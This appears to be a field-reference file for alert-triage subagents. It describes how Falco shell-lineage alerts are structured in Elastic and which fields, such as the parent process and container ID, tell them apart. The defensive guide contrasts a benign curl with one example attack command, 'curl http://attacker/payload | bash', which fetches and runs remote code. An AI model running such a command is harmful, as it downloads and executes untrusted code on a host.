---
signature_id: elastic-falco-shell-lineage
purpose: Field-level quirks for shape comparison. Read by archetype-scan and other subagents that extract observables from the alert. Not a substitute for context.md — just the gotchas.
---

# Field Quirks — elastic-falco-shell-lineage

## Key observables

| Observable | JSON path | Why it matters for shape comparison |
|-----------|-----------|-------------------------------------|
| Falco rule | `falco.rule` | Primary event identity — names the attack-lineage pattern that fired (shell spawn, ingress copy, payload decode, key install, ...) |
| Process | `falco.output_fields.proc.name` | The acting binary (e.g., `bash`, `curl`, `base64`, `echo`) |
| Parent process | `falco.output_fields.proc.pname` | **Strongest discriminator**: app-spawned (python/node/nginx) vs operator-driven (runc/containerd-shim/docker-exec) vs init-script (entrypoint, tini) |
| Process cmdline | `falco.output_fields.proc.cmdline` | Full argument string — distinguishes harmless usage from attack shape (e.g., `curl http://web-1/ -o /tmp/...` vs `curl http://attacker/payload \| bash`) |
| Touched file | `falco.output_fields.fd.name` | Present on file-write rules (authorized_keys, write-below-root) — names the actual path the rule fired on |
| Container | `falco.output_fields.container.id` | Scope — short (12-char) Docker/containerd ID. `container.name` may be `<NA>` for already-running containers (plugin v0.6.4 limitation) |
| Container image | `falco.output_fields.container.image.repository` | Keys image-baseline lookups; pairs `container.id` with the image identity |
| MITRE tags | `falco.tags` | Falco-curated MITRE technique IDs (e.g., `T1098.004`, `T1105`) — sanity-check that the rule's intended threat model matches the observed shape |
| Target host | `host.name` | The VPS the Falco daemon is running on — NOT the attacked container's owner host. Per-host attribution comes from `container.id` / `container.image.repository` |
| Timestamp | `@timestamp` | Cadence anchor — one-off vs burst vs periodic |

## Field gotchas

- **`falco.output_fields` is nested under the top-level `falco` key**
  (added by the integration's `decode_json_fields` processor). The
  upstream Falco JSON uses dotted keys (`"container.id"`) inside
  `output_fields` — Elastic re-nests them. Query the nested form:
  `falco.output_fields.container.id`, not `"falco.output_fields.container\\.id"`.
- **`pname` means parent name, not process name.** `proc.name` is the
  acting binary; `proc.pname` is who spawned it. Mixing them up
  inverts the entire story.
- **`proc.aname[2..n]`** = grandparent, great-grandparent, etc. Walk
  this when `pname` is itself a generic shell/interpreter and you
  need further ancestry.
- **`falco.priority` is Falco's priority, not Elastic's level.** They
  can differ — don't conflate them.
- **`container.name` may be `<NA>`** for containers that started
  before Falco's container plugin attached. Disposition decisions
  that depend on per-container identity should use `container.id` +
  an out-of-band lookup, not `container.name`, until the plugin's
  snapshot improves.
- **`host.name` is the VPS, not the attacked container.** Falco runs
  as a single instance on the docker host; every event carries the
  host's name regardless of which container the syscall happened in.
  Use `falco.output_fields.container.*` for per-workload scoping.
